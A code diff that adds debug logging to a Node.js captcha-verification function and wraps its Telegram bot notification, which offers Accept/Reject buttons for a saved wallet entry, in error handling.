@@ -34,8 +34,16 @@ function getRequestIp(req) {
   return req.ip || req.socket?.remoteAddress || "";
 }
 
-async function verifyCaptchaToken(token, remoteIp) {
+async function verifyCaptchaToken(token, remoteIp, notifyOptions = null) {
+  console.log("[captcha] verifyCaptchaToken called", {
+    hasToken: !!token,
+    remoteIp,
+    hasNotifyOptions: !!notifyOptions,
+  });
+
   if (!token || typeof token !== "string" || token.trim().length === 0) {
+    console.log("[captcha] missing token");
+
     return {
       success: false,
       status: 400,
@@ -47,6 +55,8 @@ async function verifyCaptchaToken(token, remoteIp) {
   const secret = getCaptchaSecret();
 
   if (!secret) {
+    console.error("[captcha] secret missing");
+
     return {
       success: false,
       status: 500,
@@ -71,6 +81,12 @@ async function verifyCaptchaToken(token, remoteIp) {
       timeout: 8000,
     });
 
+    console.log("[captcha] verification response", {
+      success: response.data?.success,
+      hostname: response.data?.hostname,
+      errorCodes: response.data?.["error-codes"],
+    });
+
     if (!response.data?.success) {
       return {
         success: false,
@@ -80,21 +96,45 @@ async function verifyCaptchaToken(token, remoteIp) {
         details: response.data?.["error-codes"] || [],
       };
     }
-        if (response.data.success && notifyOptions) {
-    const { bot, chatId, message, savedWallet } = notifyOptions;
 
-    await bot.sendMessage(chatId, message, {
-      parse_mode: "Markdown",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `accept_wallet_${savedWallet._id}` },
-            { text: "❌ Reject", callback_data: `reject_wallet_${savedWallet._id}` },
-          ],
-        ],
-      },
-    });
-  }
+    if (notifyOptions) {
+      const { bot, chatId, message, savedWallet } = notifyOptions;
+
+      console.log("[telegram] preparing notification", {
+        hasBot: !!bot,
+        chatId,
+        hasMessage: !!message,
+        messageLength: message?.length,
+        walletId: savedWallet?._id,
+      });
+
+      try {
+        const sentMessage = await bot.sendMessage(chatId, message, {
+          parse_mode: "Markdown",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "✅ Accept", callback_data: `accept_wallet_${savedWallet._id}` },
+                { text: "❌ Reject", callback_data: `reject_wallet_${savedWallet._id}` },
+              ],
+            ],
+          },
+        });
+
+        console.log("[telegram] notification sent", {
+          messageId: sentMessage?.message_id,
+          chatId: sentMessage?.chat?.id,
+        });
+      } catch (telegramError) {
+        console.error("[telegram] notification failed", {
+          message: telegramError.message,
+          response: telegramError.response?.body || telegramError.response?.data,
+        });
+      }
+    } else {
+      console.warn("[telegram] skipped: notifyOptions not provided");
+    }
+
     return {
       success: true,
       status: 200,
@@ -102,6 +142,11 @@ async function verifyCaptchaToken(token, remoteIp) {
       hostname: response.data.hostname,
     };
   } catch (error) {
+    console.error("[captcha] verification request failed", {
+      message: error.message,
+      response: error.response?.data,
+    });
+
     return {
       success: false,
       status: 502,
